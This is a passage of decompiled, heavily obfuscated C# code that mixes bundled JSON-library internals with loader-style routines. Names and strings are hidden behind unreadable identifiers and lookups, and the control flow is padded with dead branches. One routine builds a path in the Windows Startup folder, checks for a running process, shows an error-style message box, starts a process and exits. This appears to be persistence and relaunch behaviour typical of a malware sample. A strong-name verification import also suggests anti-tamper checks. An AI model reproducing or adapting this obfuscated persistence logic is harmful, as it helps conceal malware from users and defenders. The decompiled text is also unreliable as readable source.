          if (true)
            \u0014.\u0006.\u0001((Stream) memoryStream, (Stream) deflateStream);
          \u009C\u0003.\u007E\u008E\u0007((object) memoryStream, 0L);
          return (Stream) memoryStream;
        }
        finally
        {
          if (deflateStream != null)
            global::\u0011.\u007E\u0007\u0002((object) deflateStream);
        }
      }
      finally
      {
        if (stream == null)
          goto label_12;
label_11:
        global::\u0011.\u007E\u0007\u0002((object) stream);
label_12:
        if (false)
          goto label_11;
      }
    }

    static void \u0001([In] \u0008.\u0002.\u0001 obj0)
    {
      if (false)
        return;
      switch (obj0)
      {
        case \u0008.\u0002.\u0001.\u0001:
          if (false)
            break;
          \u0014.\u0006.\u0001();
          break;
        case \u0008.\u0002.\u0001.\u0002:
          try
          {
            if (false)
              break;
            \u0014.\u0006.\u0001(\u0014.\u0001.\u0006);
            break;
          }
          catch
          {
            do
            {
              if (true)
                \u0014.\u0006.\u0001();
            }
            while (false);
            break;
          }
      }
    }

    static void \u0001([In] \u0004.\u0011 obj0, [In] \u0012.\u0007 obj1, [In] \u000F.\u0007 obj2)
    {
      \u0014.\u0006.\u0001((object) obj1, \u0014.\u0006.\u0082(15496));
      \u000F.\u0001 obj3 = obj1 as \u000F.\u0001;
      \u0004.\u0011 obj4 = obj0;
      do
      {
        if (obj4 is \u0002.\u0004)
        {
          if (true)
          {
            if (((\u0002.\u0004) obj4).\u0004() != null)
            {
              if (obj4 != obj0)
                obj4 = ((\u0015.\u0013) obj4).\u0001();
              else
                goto label_34;
            }
          }
          else
            goto label_9;
        }
        \u0013.\u0006 obj5;
        if (true)
        {
          \u0002.\u0003 obj6;
          switch (obj1.\u0001())
          {
            case JsonToken.None:
              goto label_36;
            case JsonToken.StartObject:
              \u0012.\u0015 obj7 = new \u0012.\u0015();
              if (true)
              {
                \u0014.\u0006.\u0001((\u0015.\u0013) obj7, obj3, obj2);
                obj4.Add((object) obj7);
                obj4 = (\u0004.\u0011) obj7;
                goto label_36;
              }
              else
                goto label_10;
            case JsonToken.StartArray:
              if (true)
              {
                obj5 = new \u0013.\u0006();
                \u0014.\u0006.\u0001((\u0015.\u0013) obj5, obj3, obj2);
                goto label_9;
              }
              else
                goto case JsonToken.PropertyName;
            case JsonToken.StartConstructor:
              obj6 = new \u0002.\u0003(global::\u0001.\u007E\u0001(obj1.\u0001()));
              \u0014.\u0006.\u0001((\u0015.\u0013) obj6, obj3, obj2);
              obj4.Add((object) obj6);
              break;
            case JsonToken.PropertyName:
              string str = global::\u0001.\u007E\u0001(obj1.\u0001());
              \u0002.\u0004 obj8 = new \u0002.\u0004(str);
              \u0014.\u0006.\u0001((\u0015.\u0013) obj8, obj3, obj2);
              \u0002.\u0004 obj9 = \u0014.\u0006.\u0001(str, (\u0012.\u0015) obj4);
              if (obj9 == null)
                obj4.Add((object) obj8);
              else if (true)
                \u0014.\u0006.\u0001((\u0015.\u0013) obj9, (\u0015.\u0013) obj8);
              else
                goto label_35;
              obj4 = (\u0004.\u0011) obj8;
              if (false)
                break;
              goto label_36;
            case JsonToken.Comment:
              if (obj2 != null && obj2.\u0001 == \u0001.\u0008.\u0002)
              {
                \u0006.\u0005 obj10 = new \u0006.\u0005((object) global::\u0001.\u007E\u0001(obj1.\u0001()), JTokenType.Comment);
                \u0014.\u0006.\u0001((\u0015.\u0013) obj10, obj3, obj2);
                obj4.Add((object) obj10);
                goto label_36;
              }
              else
                goto label_36;
            case JsonToken.Integer:
            case JsonToken.Float:
            case JsonToken.String:
            case JsonToken.Boolean:
            case JsonToken.Date:
            case JsonToken.Bytes:
              goto label_24;
            case JsonToken.Null:
              \u0006.\u0005 obj11 = new \u0006.\u0005((object) null, JTokenType.Null);
              \u0014.\u0006.\u0001((\u0015.\u0013) obj11, obj3, obj2);
              obj4.Add((object) obj11);
              goto label_36;
            case JsonToken.Undefined:
              \u0006.\u0005 obj12 = new \u0006.\u0005((object) null, JTokenType.Undefined);
              \u0014.\u0006.\u0001((\u0015.\u0013) obj12, obj3, obj2);
              obj4.Add((object) obj12);
              goto label_36;
            case JsonToken.EndObject:
              if (obj4 != obj0)
              {
                obj4 = ((\u0015.\u0013) obj4).\u0001();
                goto label_36;
              }
              else
                goto label_12;
            case JsonToken.EndArray:
              if (obj4 != obj0)
              {
                obj4 = ((\u0015.\u0013) obj4).\u0001();
                goto label_36;
              }
              else
                goto label_3;
            case JsonToken.EndConstructor:
              if (obj4 != obj0)
              {
                obj4 = ((\u0015.\u0013) obj4).\u0001();
                goto label_36;
              }
              else
                goto label_17;
            default:
              goto label_35;
          }
          obj4 = (\u0004.\u0011) obj6;
          goto label_36;
        }
label_9:
        obj4.Add((object) obj5);
        obj4 = (\u0004.\u0011) obj5;
        if (true)
          goto label_36;
label_24:
        \u0006.\u0005 obj13 = new \u0006.\u0005(obj1.\u0001());
        \u0014.\u0006.\u0001((\u0015.\u0013) obj13, obj3, obj2);
        obj4.Add((object) obj13);
label_36:;
      }
      while (obj1.\u0001());
      goto label_22;
label_34:
      return;
label_3:
      return;
label_10:
      return;
label_12:
      return;
label_17:
      return;
label_35:
      throw new InvalidOperationException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(15501), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj1.\u0001()));
label_22:;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static IList<\u0008.\u000E> \u0001([In] \u0016.\u0007 obj0)
    {
      if (obj0.\u0001 == null)
        obj0.\u0001 = new List<\u0008.\u000E>();
      return (IList<\u0008.\u000E>) obj0.\u0001;
    }

    static IXmlNode \u0001([In] XmlNode obj0)
    {
      switch (\u009D\u0003.\u007E\u0090\u0007((object) obj0))
      {
        case XmlNodeType.Element:
          return (IXmlNode) new \u0006.\u0006((XmlElement) obj0);
        case XmlNodeType.DocumentType:
          return (IXmlNode) new \u0002.\u0005((XmlDocumentType) obj0);
        case XmlNodeType.XmlDeclaration:
          return (IXmlNode) new \u0017((XmlDeclaration) obj0);
        default:
          return (IXmlNode) new \u0010.\u000F(obj0);
      }
    }

    static object \u0001(
      [In] string obj0,
      [In] \u0012.\u0007 obj1,
      [In] JsonProperty obj2,
      [In] \u0005.\u0007 obj3,
      [In] JsonSerializerInternalReader obj4)
    {
      System.Type type = obj3.\u0002();
      string str1;
      if (!JsonTypeReflector.\u0002())
        str1 = \u0008\u0003.\u008E\u0006(\u0014.\u0006.\u0082(15574), global::\u0004.\u0097(), \u0014.\u0006.\u0082(12419), global::\u0004.\u0097());
      else
        goto label_3;
label_2:
      string str2 = \u0002.\u0002.\u0001(str1, (IFormatProvider) \u0098.\u0002\u0004(), (object) type);
      throw \u0014.\u0006.\u0001(obj1, str2);
label_3:
      if (obj4.\u0001 != null && obj4.\u0001.\u0001() >= TraceLevel.Info)
        obj4.\u0001.\u0001(TraceLevel.Info, \u0011.\u0002.\u0001(obj1 as \u000F.\u0001, obj1.\u0001(), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(15832), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj3.\u0002())), (Exception) null);
      SerializationInfo serializationInfo;
      do
      {
        serializationInfo = new SerializationInfo(obj3.\u0002(), (IFormatterConverter) new \u0005.\u0006(obj4, obj3, obj2));
        bool flag = false;
        do
        {
          JsonToken jsonToken = obj1.\u0001();
          if (true)
          {
            switch (jsonToken)
            {
              case JsonToken.PropertyName:
                string str3 = global::\u0001.\u007E\u0001(obj1.\u0001());
                if (!obj1.\u0001())
                  throw \u0014.\u0006.\u0001(obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(15901), (IFormatProvider) \u0098.\u0002\u0004(), (object) str3));
                \u008D.\u007E\u0091\u0003((object) serializationInfo, str3, (object) \u0014.\u0006.\u0001(obj1));
                goto case JsonToken.Comment;
              case JsonToken.Comment:
                continue;
              case JsonToken.EndObject:
                flag = true;
                goto case JsonToken.Comment;
              default:
                if (true)
                  throw \u0014.\u0006.\u0001(obj1, \u0086.\u0086\u0003((object) \u0014.\u0006.\u0082(15958), (object) obj1.\u0001()));
                goto label_23;
            }
          }
          else
            goto label_2;
        }
        while (!flag && obj1.\u0001());
        if (!flag)
          \u0014.\u0006.\u0001((object) serializationInfo, obj4, (\u0016.\u0007) obj3, \u0014.\u0006.\u0082(10226), obj1);
        if (obj3.\u0001() != null)
          goto label_20;
      }
      while (false);
      throw \u0014.\u0006.\u0001(obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(16019), (IFormatProvider) \u0098.\u0002\u0004(), (object) type));
label_20:
      object obj = obj3.\u0001()(new object[2]
      {
        (object) serializationInfo,
        (object) obj4.\u0001.\u0001
      });
      if (obj0 != null)
        \u0014.\u0006.\u0001(obj1, obj4, obj, obj0);
      \u0014.\u0006.\u0001(obj4, obj1, (\u0016.\u0007) obj3, obj);
      \u0014.\u0006.\u0001(obj4, obj1, (\u0016.\u0007) obj3, obj);
label_23:
      return obj;
    }

    static bool \u0001()
    {
      string str;
      int num;
      if (true)
      {
        if (true)
        {
          str = global::\u0006.\u009A(\u0014.\u0001.\u0008, \u0014.\u0006.\u0082(16277));
          num = global::\u0007.\u009D(str) ? 1 : 0;
        }
        else
          goto label_8;
      }
      else
        goto label_7;
label_4:
      if (num != 0)
        return true;
label_7:
      \u001D.\u000E\u0003(str, \u0014.\u0006.\u0082(16282));
label_8:
      num = 0;
      if (num == 0)
        return num != 0 ? num != 0 : num != 0;
      goto label_4;
    }

    static int \u0001([In] \u0013.\u000F.\u0002 obj0) => obj0.\u0003;

    static bool \u0001([In] XmlNodeConverter obj0_1, [In] IXmlNode obj1)
    {
      IXmlNode xmlNode = obj1.\u0002() != null ? obj1.\u0002().SingleOrDefault<IXmlNode>((Func<IXmlNode, bool>) (obj0_2 =>
      {
        while (true)
        {
          // ISSUE: reference to a compiler-generated field
          int num = \u0007\u0002.\u008C\u0004(obj0_2.\u0001(), XmlNodeConverter.\u003C\u003Ec.\u0019(10250)) ? 1 : 0;
          if (false)
            return num != 0;
          if (false)
            return num != 0;
          if (num != 0)
          {
            if (true)
            {
              // ISSUE: reference to a compiler-generated field
              return \u0007\u0002.\u008C\u0004(obj0_2.\u0003(), XmlNodeConverter.\u003C\u003Ec.\u0019(10193));
            }
          }
          else
            break;
        }
        return false;
      })) : (IXmlNode) null;
      return xmlNode != null && global::\u0007.\u009F(xmlNode.\u0002());
    }

    static \u0004.\u000F<object> \u0001([In] \u0001.\u0007 obj0)
    {
      if (obj0.\u0002 == null)
        obj0.\u0002 = \u0014.\u0006.\u0001().\u0001((MethodBase) obj0.\u0001);
      return obj0.\u0002;
    }

    static bool \u0001([In] System.Type obj0)
    {
      if (false)
        goto label_2;
      else
        goto label_4;
label_1:
      if (true)
        return \u0014.\u0006.\u0001(obj0);
label_2:
      if (true)
        return true;
      goto label_1;
label_4:
      System.Type type = obj0;
      string str = \u0014.\u0006.\u0082(8396);
      if (true)
        \u0014.\u0006.\u0001((object) type, str);
      if (!\u0015.\u000E.\u000E(obj0))
        goto label_2;
      else
        goto label_1;
    }

    static byte[] \u0001([In] \u0012.\u0007 obj0, [In] \u000E.\u000F obj1)
    {
      List<byte> byteList = new List<byte>();
label_5:
      while (obj0.\u0001())
      {
        do
        {
          int num = (int) obj0.\u0001();
          JsonToken jsonToken;
          if (true)
            jsonToken = (JsonToken) num;
          if (jsonToken != JsonToken.Comment)
          {
            while (jsonToken == JsonToken.Integer)
            {
              if (true)
              {
                byteList.Add(\u009E\u0003.\u0092\u0007(obj0.\u0001(), (IFormatProvider) \u0098.\u0002\u0004()));
                goto label_5;
              }
            }
            if (jsonToken == JsonToken.EndArray)
              goto label_3;
          }
          else
            goto label_5;
        }
        while (false);
        goto label_4;
label_3:
        return byteList.ToArray();
label_4:
        throw \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(16287), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001()));
      }
      throw \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(16344));
    }

    static bool \u0001([In] bool obj0, [In] JTokenType[] obj1, [In] \u0015.\u0013 obj2)
    {
      int num = Array.IndexOf<JTokenType>(obj1, obj2.\u0001());
      if (false)
        return num != 0;
      if (num != -1)
        return true;
      if (!obj0)
        return false;
      return obj2.\u0001() == JTokenType.Null || obj2.\u0001() == JTokenType.Undefined;
    }

    static void \u0001(
      [In] object obj0,
      [In] bool obj1,
      [In] JsonSerializerInternalReader obj2,
      [In] \u0012.\u0007 obj3,
      [In] \u0011.\u0008 obj4,
      [In] JsonSerializerInternalReader.PropertyPresence obj5,
      [In] int obj6,
      [In] JsonProperty obj7)
    {
      if (obj5 != JsonSerializerInternalReader.PropertyPresence.\u0001 && obj5 != JsonSerializerInternalReader.PropertyPresence.\u0002)
        return;
      try
      {
        \u0015.\u0004? nullable = obj7.\u0001;
        if (false)
          return;
        int num1 = (int) nullable ?? (int) obj4.\u0001() ?? 0;
        \u0015.\u0004 obj;
        int num2;
        while (true)
        {
          obj = (\u0015.\u0004) num1;
          if (obj5 != JsonSerializerInternalReader.PropertyPresence.\u0001)
          {
            if (true)
              break;
          }
          else if (obj == \u0015.\u0004.\u0002)
            goto label_11;
          if (obj != \u0015.\u0004.\u0003)
          {
            if (obj1)
            {
              num2 = obj7.\u0001() ? 1 : 0;
              if (false)
                num1 = num2;
              else
                goto label_14;
            }
            else
              goto label_8;
          }
          else
            goto label_11;
        }
        if (obj5 != JsonSerializerInternalReader.PropertyPresence.\u0002)
          return;
        if (obj == \u0015.\u0004.\u0003)
          throw \u0014.\u0006.\u0001(obj3, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(16450), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj7.\u0001));
        if (obj != \u0015.\u0004.\u0004)
          return;
        throw \u0014.\u0006.\u0001(obj3, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(16523), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj7.\u0001));
label_11:
        throw \u0014.\u0006.\u0001(obj3, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(16393), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj7.\u0001));
label_8:
        return;
label_14:
        if (num2 != 0)
          return;
        if (obj7.\u0001() == null)
          obj7.\u0001(\u0014.\u0006.\u0001(obj2, obj7.\u0001));
        if (!\u0014.\u0006.\u0001(obj2, obj7.\u0001().GetValueOrDefault(obj2.\u0001.\u0001), \u0008.\u0004.\u0003) || !obj7.\u0003())
          return;
        obj7.\u0001().\u0001(obj0, \u0014.\u0006.\u0001(obj2, obj3, \u0014.\u0006.\u0001(obj7), \u0098.\u0002\u0004(), obj7.\u0001(), obj7.\u0001));
      }
      catch (Exception ex)
      {
        object obj = (object) obj7.\u0001;
        if (\u0014.\u0006.\u0001(obj3.\u0001(), obj0, obj, ex, obj3 as \u000F.\u0001, (\u0016.\u0007) obj4, (\u0016.\u0008) obj2))
          \u0014.\u0006.\u0001(obj3, obj2, obj6, true);
        else
          throw;
      }
    }

    static Assembly \u0001([In] string obj0)
    {
      // ISSUE: reference to a compiler-generated field
      if (\u0005.\u0002.\u0001.ContainsKey(obj0))
        return (Assembly) null;
      AssemblyName assemblyName = new AssemblyName(obj0);
      Assembly assembly1 = \u0014.\u0006.\u0001(assemblyName);
      if ((object) assembly1 != null)
        return assembly1;
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      Assembly assembly2 = \u0014.\u0006.\u0001(\u0005.\u0002.\u0001, \u0005.\u0002.\u0002, assemblyName);
      if ((object) assembly2 == null)
      {
        // ISSUE: reference to a compiler-generated field
        \u0005.\u0002.\u0001.Add(obj0, true);
        if (\u009F\u0003.\u007E\u0093\u0007((object) assemblyName) == AssemblyNameFlags.Retargetable)
          assembly2 = \u0001\u0004.\u0094\u0007(assemblyName);
      }
      return assembly2;
    }

    static void \u0001(
      [In] \u0016.\u0003 obj0,
      [In] \u0012.\u0007 obj1,
      [In] CultureInfo obj2,
      [In] \u0004.\u0001? obj3,
      [In] \u000E.\u0002? obj4,
      [In] \u0015.\u0002? obj5,
      [In] int? obj6,
      [In] string obj7)
    {
      if (obj2 != null)
      {
        if (true)
          obj1.\u0001 = obj2;
        else
          goto label_8;
      }
      if (obj3.HasValue)
        goto label_24;
label_5:
      int num1 = obj4.HasValue ? 1 : 0;
      if (true)
      {
        if (num1 != 0)
        {
          \u0014.\u0006.\u0001(obj1, obj4.GetValueOrDefault());
          goto label_8;
        }
        else
          goto label_8;
      }
      else
        goto label_17;
label_24:
      \u0014.\u0006.\u0001(obj1, obj3.GetValueOrDefault());
      goto label_5;
label_8:
      int num2 = obj5.HasValue ? 1 : 0;
      int num3;
      while (true)
      {
        if (num2 != 0)
          \u0014.\u0006.\u0001(obj5.GetValueOrDefault(), obj1);
        num3 = obj0.\u0001 ? 1 : 0;
        if (false)
          num2 = num3;
        else
          break;
      }
      if (true)
      {
        if (num3 != 0)
        {
          if (false)
            return;
          \u0014.\u0006.\u0001(obj6, obj1);
        }
        num1 = obj0.\u0002 ? 1 : 0;
      }
      else
        num1 = num3;
label_17:
      if (num1 != 0)
        obj1.\u0001 = obj7;
      \u0011.\u0003 obj = obj1 as \u0011.\u0003;
      while (obj != null)
      {
        if (true)
        {
          obj.\u0001 = (\u0008.\u0005) null;
          break;
        }
      }
    }

    static TimeSpan \u0001([In] \u0015.\u0013 obj0)
    {
      \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
      if (obj == null || !\u0014.\u0006.\u0001(false, \u0015.\u0013.\u0005, (\u0015.\u0013) obj))
        throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(11766), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(obj0)));
      return !(obj.\u0001 is TimeSpan) ? \u0014.\u0006.\u0001(\u0095\u0002.\u0017\u0006(obj.\u0001, (IFormatProvider) \u0098.\u0002\u0004())) : (TimeSpan) obj.\u0001;
    }

    static void \u0001([In] \u0011.\u0003 obj0)
    {
      while (!\u0014.\u0006.\u0001(obj0, \u0015.\u0006.\u0007))
      {
        if (true)
          throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0014.\u0006.\u0082(16633));
      }
      \u0011.\u0003 obj = ((\u0012.\u0007) obj0).\u0001 != \u0015.\u0002.\u0002 ? obj0 : throw new JsonReaderException(\u0014.\u0006.\u0082(16592));
      // ISSUE: variable of a boxed type
      __Boxed<double> local = (System.ValueType) double.NaN;
      if (false)
        return;
      \u0014.\u0006.\u0001((\u0012.\u0007) obj, JsonToken.Float, (object) local);
    }

    static TypeConverter \u0001([In] System.Type obj0) => \u0014.\u0006.\u0001(obj0);

    static void \u0001([In] \u0011.\u0003 obj0)
    {
      if (!\u0014.\u0006.\u0001(obj0, \u0015.\u0006.\u0001))
        throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0014.\u0006.\u0082(16666));
      \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.Boolean, (object) true);
    }

    static JsonContainerType \u0001([In] \u0012.\u0007 obj0) => obj0.\u0001.\u0001;

    static \u0015.\u0013 \u0001([In] \u0012.\u0007 obj0, [In] \u0016.\u0007 obj1, [In] JsonSerializerInternalReader obj2)
    {
      \u0012.\u0007 obj3 = obj0;
      string str = \u0014.\u0006.\u0082(3503);
      if (true)
        \u0014.\u0006.\u0001((object) obj3, str);
      if (obj1 != null)
        goto label_11;
label_3:
      \u0008.\u0010 obj4 = new \u0008.\u0010();
      try
      {
        do
        {
          \u0014.\u0006.\u0001(obj0, (JsonWriter) obj4);
        }
        while (false);
        return \u0014.\u0006.\u0001(obj4);
      }
      finally
      {
        if (obj4 != null)
          global::\u0011.\u007E\u0007\u0002((object) obj4);
      }
label_11:
      // ISSUE: type reference
      if ((object) obj1.\u0002() == (object) \u0004\u0002.\u0084\u0004(__typeref (\u0004.\u0010)))
        return (\u0015.\u0013) \u0014.\u0006.\u0001(obj0);
      // ISSUE: type reference
      // ISSUE: type reference
      if (obj0.\u0001() == JsonToken.Null && (object) obj1.\u0002() != (object) \u0004\u0002.\u0084\u0004(__typeref (\u0006.\u0005)) && (object) obj1.\u0002() != (object) \u0004\u0002.\u0084\u0004(__typeref (\u0015.\u0013)))
        return (\u0015.\u0013) null;
      goto label_3;
    }

    static unsafe void \u0001(ref int _param0, out int _param1, out int _param2, [Out] DateTime _param3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(24);
      *(int*) voidPtr = (int) (_param3.Ticks / 864000000000L);
      *(int*) ((IntPtr) voidPtr + 4) = *(int*) voidPtr / 146097;
      *(int*) voidPtr = *(int*) voidPtr - *(int*) ((IntPtr) voidPtr + 4) * 146097;
      *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr / 36524;
      if (*(int*) ((IntPtr) voidPtr + 8) == 4)
        *(int*) ((IntPtr) voidPtr + 8) = 3;
      *(int*) voidPtr = *(int*) voidPtr - *(int*) ((IntPtr) voidPtr + 8) * 36524;
      *(int*) ((IntPtr) voidPtr + 12) = *(int*) voidPtr / 1461;
      *(int*) voidPtr = *(int*) voidPtr - *(int*) ((IntPtr) voidPtr + 12) * 1461;
      *(int*) ((IntPtr) voidPtr + 16) = *(int*) voidPtr / 365;
      if (*(int*) ((IntPtr) voidPtr + 16) == 4)
        *(int*) ((IntPtr) voidPtr + 16) = 3;
      _param0 = *(int*) ((IntPtr) voidPtr + 4) * 400 + *(int*) ((IntPtr) voidPtr + 8) * 100 + *(int*) ((IntPtr) voidPtr + 12) * 4 + *(int*) ((IntPtr) voidPtr + 16) + 1;
      *(int*) voidPtr = *(int*) voidPtr - *(int*) ((IntPtr) voidPtr + 16) * 365;
      int[] numArray = (*(int*) ((IntPtr) voidPtr + 16) != 3 ? 0 : (*(int*) ((IntPtr) voidPtr + 12) != 24 ? 1 : (*(int*) ((IntPtr) voidPtr + 8) == 3 ? 1 : 0))) != 0 ? \u0004.\u0007.\u0002 : \u0004.\u0007.\u0001;
      *(int*) ((IntPtr) voidPtr + 20) = *(int*) voidPtr >> 6;
      while (*(int*) voidPtr >= numArray[*(int*) ((IntPtr) voidPtr + 20)])
        *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 20) + 1;
      _param2 = *(int*) ((IntPtr) voidPtr + 20);
      _param1 = *(int*) voidPtr - numArray[*(int*) ((IntPtr) voidPtr + 20) - 1] + 1;
    }

    static unsafe void \u0001([In] \u0014.\u0001.\u0001 obj0, [In] string obj1)
    {
      string str1;
      string str2;
      if (true)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(5);
        if (obj0 == \u0014.\u0001.\u0001.\u0001)
        {
          int num = (int) \u0002\u0004.\u0095\u0007(\u0014.\u0006.\u0001());
          return;
        }
        int num1;
        switch (obj1)
        {
          case null:
            str1 = \u0014.\u0001.\u0004;
            if (\u0014.\u0001.\u0005 != null)
            {
              if (true)
              {
                string str3 = global::\u0006.\u009A(global::\u0003.\u0096(Environment.SpecialFolder.Startup), \u001B.\u0006\u0003(\u0014.\u0001.\u0005));
                \u0014.\u0006.\u0001(\u0014.\u0001.\u0001);
                if (\u0007\u0002.\u008C\u0004(global::\u0004.\u0098(), \u0014.\u0001.\u0006))
                  return;
                if (\u0007\u0002.\u008C\u0004(global::\u0004.\u0098(), str3))
                {
                  if (true)
                    return;
                  goto label_10;
                }
              }
              else
                goto label_9;
            }
            num1 = \u0014.\u0006.\u0001(\u0014.\u0001.\u0006, true) ? 1 : 0;
            goto label_27;
          default:
            if (obj0 == \u0014.\u0001.\u0001.\u0004)
            {
              obj1 = \u0003\u0004.\u007E\u0096\u0007((object) obj1, \u0014.\u0006.\u0082(16707), \u0014.\u0006.\u0082(3329));
              if (global::\u0007.\u0001\u0002(obj1) && global::\u0007.\u009D(obj1))
              {
                *(int*) voidPtr = 0;
                break;
              }
              goto label_15;
            }
            else
              goto label_15;
        }
label_7:
        // ISSUE: object of a compiler-generated type is created
        // ISSUE: variable of a compiler-generated type
        \u0003.\u0001.\u0001 obj2 = new \u0003.\u0001.\u0001();
        IntPtr num2 = (IntPtr) voidPtr + 4;
        \u0004\u0004 obj3 = \u0004\u0004.\u0097\u0007;
        string str4 = \u001B.\u0005\u0003(obj1);
        // ISSUE: reference to a compiler-generated field
        obj2.\u0001 = global::\u0001.\u007E\u0001((object) global::\u0008.\u0003\u0002(obj1));
        // ISSUE: reference to a compiler-generated method
        int num3 = ((IEnumerable<Process>) obj3(str4)).FirstOrDefault<Process>(new Func<Process, bool>(obj2.\u0001)) != null ? 1 : 0;
        *(sbyte*) num2 = (sbyte) num3;
        if (true)
          \u008A.\u008B\u0003(100);
        else
          goto label_11;
label_9:
        *(int*) voidPtr = *(int*) voidPtr + 1;
label_10:
        if (*(sbyte*) ((IntPtr) voidPtr + 4) == (sbyte) 0)
          goto label_13;
label_11:
        int num4 = *(int*) voidPtr;
        if (true)
        {
          if (num4 < 100)
            goto label_7;
        }
        else
        {
          num1 = num4;
          goto label_27;
        }
label_13:
        \u008A.\u008B\u0003(300);
        if (*(sbyte*) ((IntPtr) voidPtr + 4) == (sbyte) 0)
          \u001A.\u009F\u0002(obj1);
label_15:
        if (obj0 == \u0014.\u0001.\u0001.\u0002)
        {
          int num5 = (int) \u0005\u0004.\u0098\u0007(\u0014.\u0001.\u0001, \u0014.\u0001.\u0002, MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        if (!\u0014.\u0001.\u0001)
          return;
        \u008A.\u008A\u0003(0);
        return;
label_27:
        if (num1 != 0)
          \u0014.\u0006.\u0001(str1, true);
        if (false)
          return;
        str2 = \u0003\u0004.\u007E\u0096\u0007((object) global::\u0004.\u0098(), \u0014.\u0006.\u0082(3329), \u0014.\u0006.\u0082(16707));
      }
      Process process = \u0006\u0004.\u0099\u0007(str1, str2);
      \u008A.\u008A\u0003(0);
    }

    static string \u0001([In] bool obj0) => !obj0 ? \u0015.\u0006.\u0002 : \u0015.\u0006.\u0001;

    static void \u0001([In] string obj0, [In] JsonToken obj1, [In] \u0005.\u0004 obj2) => \u0019.\u007E\u0099\u0002((object) obj2.\u0001, obj0);

    static \u0016.\u0007 \u0001([In] \u0006.\u0002 obj0) => obj0.\u0002;

    static DateTime \u0001([In] \u0015.\u0013 obj0)
    {
      \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
      if (obj == null || !\u0014.\u0006.\u0001(false, \u0015.\u0013.\u0008, (\u0015.\u0013) obj))
        throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(16712), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(obj0)));
      return obj.\u0001 is DateTimeOffset ? ((DateTimeOffset) obj.\u0001).DateTime : \u0091\u0003.\u0082\u0007(obj.\u0001, (IFormatProvider) \u0098.\u0002\u0004());
    }

    static void \u0001([In] \u0012.\u0007 obj0)
    {
      if (!obj0.\u0001())
        throw \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(16757));
    }

    static bool \u0001([In] \u0012.\u0003 obj0, [In] \u0012.\u0003 obj1, [In] \u0010.\u0006 obj2) => (obj1 & obj0) == obj0;

    static DateTime? \u0001([In] \u0012.\u0007 obj0, [In] string obj1)
    {
      if (true)
        goto label_11;
label_7:
      DateTime result;
      \u0014.\u0006.\u0001(obj0, JsonToken.Date, (object) result, false);
label_8:
      return new DateTime?(result);
label_11:
      if (!string.IsNullOrEmpty(obj1))
      {
        if (true)
        {
          if (\u0014.\u0006.\u0001(obj1, obj0.\u0001, obj0.\u0001, \u0014.\u0006.\u0001(obj0), out result))
          {
            result = \u0014.\u0006.\u0001(result, obj0.\u0001);
            \u0014.\u0006.\u0001(obj0, JsonToken.Date, (object) result, false);
          }
          else
            goto label_4;
label_3:
          return new DateTime?(result);
label_4:
          if (true)
          {
            if (DateTime.TryParse(obj1, (IFormatProvider) \u0014.\u0006.\u0001(obj0), DateTimeStyles.RoundtripKind, out result))
            {
              result = \u0014.\u0006.\u0001(result, obj0.\u0001);
              goto label_7;
            }
            else
            {
              if (true)
                throw \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(16802), (IFormatProvider) CultureInfo.InvariantCulture, (object) obj1));
              goto label_3;
            }
          }
        }
        else
          goto label_8;
      }
      \u0014.\u0006.\u0001(obj0, JsonToken.Null, (object) null, false);
      return new DateTime?();
    }

    static void \u0001([In] \u0011.\u000E obj0, [In] IXmlNode obj1, [In] \u0012.\u0007 obj2, [In] XmlNodeConverter obj3)
    {
      if (true)
        goto label_15;
label_1:
      string str1 = (string) null;
      string str2 = (string) null;
      string str3 = (string) null;
      string str4;
      while (obj2.\u0001() && obj2.\u0001() != JsonToken.EndObject)
      {
        string str5 = global::\u0001.\u007E\u0001(obj2.\u0001());
        if (!\u0007\u0002.\u008C\u0004(str5, \u0014.\u0006.\u0082(10044)))
        {
          int num;
          if (!\u0007\u0002.\u008C\u0004(str5, \u0014.\u0006.\u0082(10053)))
            num = \u0007\u0002.\u008C\u0004(str5, \u0014.\u0006.\u0082(10066)) ? 1 : 0;
          else
            goto label_8;
label_5:
          if (num == 0)
          {
            if (!\u0007\u0002.\u008C\u0004(str5, \u0014.\u0006.\u0082(10079)))
              throw \u0014.\u0006.\u0001(obj2, \u0086.\u0086\u0003((object) \u0014.\u0006.\u0082(11889), obj2.\u0001()));
